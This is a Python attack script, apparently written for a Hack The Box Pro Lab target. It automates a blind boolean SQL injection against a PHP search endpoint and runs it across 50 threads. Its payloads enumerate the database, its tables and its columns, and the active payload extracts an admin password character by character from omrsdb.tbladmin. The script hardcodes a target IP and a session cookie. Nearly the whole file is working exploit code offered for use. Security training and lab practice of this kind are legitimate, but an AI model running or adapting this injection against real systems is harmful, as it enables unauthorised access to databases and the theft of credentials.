#!/usr/bin/env python3
'''
Created this to exploit one of the targets on a Hack The Box Pro Lab.
This script exploits a blind boolean sql injection to exfiltrate data.  
'''

import requests
import string
import concurrent.futures

# create ascii lists
def create_ascii_list():
    numlist= []
    for num in range(30,127):
        numlist.append(num)
    return numlist

def create_substring_num():
    numlist2= []
    for num in range(1,25):
        numlist2.append(num)
    return numlist2

def create_offset_num():
    numlist3= []
    for num in range(0,1):
        numlist3.append(num)
    return numlist3
    
# Run blind boolean sql injection
def sqli(substring_num, offset_num, num):
    target="152.16.1.122"
    proxies= {"http":"http://127.0.0.1:8080"}
    headers={"Content-Type": "multipart/form-data; boundary=---------------------------14194286839629436173433476678"}
    cookies= {"PHPSESSID":"uid6fpgvaiqjoumjtif5da5lt5"}
    charlist= string.digits + string.ascii_letters + string.punctuation
    #payload= f"donenostexist'or (select ascii(substring(database(),{substring_num},1))limit 1 offset {offset_num})={num}-- -"
    #payload= f"donenostexist'or (select ascii(substring(table_name,{substring_num},1))from information_schema.tables where table_schema='omrsdb' limit 1 offset {offset_num})={num}-- -"
    #payload= f"donenostexist'or (select ascii(substring(column_name,{substring_num},1))from information_schema.columns where table_schema='omrsdb' and table_name='tbladmin' limit 1 offset {offset_num})={num}-- -"
    payload= f"donenostexist'or (select ascii(substring(password,{substring_num},1))from omrsdb.tbladmin limit 1 offset {offset_num})={num}-- -"
    
    data=f'''-----------------------------14194286839629436173433476678
Content-Disposition: form-data; name="searchdata"

{payload}
-----------------------------14194286839629436173433476678
Content-Disposition: form-data; name="search"

-----------------------------14194286839629436173433476678--'''

    response= requests.post(url=f"http://{target}/user/search.php", headers=headers, proxies=proxies, verify=False, allow_redirects=True, cookies=cookies, data=data)
    
    if "No record found" not in response.text:
        translated_num= chr(num)
        secret= f"Substring number={substring_num}: Offset number={offset_num}: value is: {translated_num}"
        return secret
    else:
        return None

# Use multithreading to make sqli faster
def increase_speed():
    ascii_numlist= create_ascii_list()
    substring_numlist= create_substring_num()
    offset_numlist= create_offset_num()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_test= {executor.submit(sqli, substring_num, offset_num, num): (substring_num, offset_num, num) for substring_num in substring_numlist for offset_num in offset_numlist for num in ascii_numlist}
        for future in concurrent.futures.as_completed(future_to_test):
            result= future.result()
            if result is not None:
                print(f"{result}")
    

try:
    increase_speed()
except KeyboardInterrupt:
    print("Ctrl + c detected, exiting gracefully")
